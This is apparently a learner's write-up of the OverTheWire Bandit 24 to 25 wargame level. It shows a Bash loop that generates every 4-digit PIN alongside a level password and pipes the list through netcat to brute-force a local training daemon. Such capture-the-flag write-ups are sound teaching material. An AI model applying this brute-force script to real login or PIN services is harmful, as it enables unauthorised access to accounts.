# Bandit24 -> 25: The PIN Code Brute Force

[Challenge](https://overthewire.org/wargames/bandit/bandit24.html)

## Level Description

A daemon is listening on **port 30002**. If you send it the password for **bandit24** followed by a space and a **4-digit PIN code**, it will give you the password for Level 25. There is no way to retrieve the PIN, so you must try every possible combination from **0000 to 9999**.

## The Process

This level introduces the concept of **brute-forcing**. Since there are 10,000 possible PINs, I couldn't possibly type them all by hand. I needed to automate the process by creating a script that generates all combinations and sends them to the server.

### The Logic

A 4-digit PIN ranges from `0000` to `9999`. For each PIN, the required format is:
`bandit24_password PIN`

I used a simple Bash `for` loop to generate this list.

### The Execution

Instead of making 10,000 separate network connections (which would be slow and might get me blocked), I generated one giant list of commands and "piped" them all into a single Netcat connection.

1. **Generate the list**:
I used brace expansion `{0000..9999}` to quickly create the range.
```bash
for i in {0000..9999}; do
    echo "UoMYTrfr6ocUrss6S866666666666666 $i"
done > /tmp/mylist.txt

```


2. **Send to the server**:
I pushed that entire file into the service at port 30002.
```bash
cat /tmp/mylist.txt | nc localhost 30002

```



The server processed the requests rapidly. Most lines returned "Wrong!", but eventually, one line matched, and the server spit out the password for Bandit25.

## Password For the Next Level

`[SPOILER]`

## What I Learned

* **Brute-Forcing**: I learned how to systematically test all possibilities when a secret (like a PIN) is short enough to be guessed by a computer.
* **Bash Loops and Ranges**: I learned how to use `{0000..9999}` to generate padded numbers (like 0001 instead of just 1).
* **Efficiency with Pipes**: I learned that sending one large stream of data is much more efficient than opening thousands of individual connections.

## Helpful Reading Material

* Bash For Loops: [How to loop in Bash](https://linuxize.com/post/bash-for-loop/)
* Brace Expansion: [Bash Brace Expansion Examples](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html)
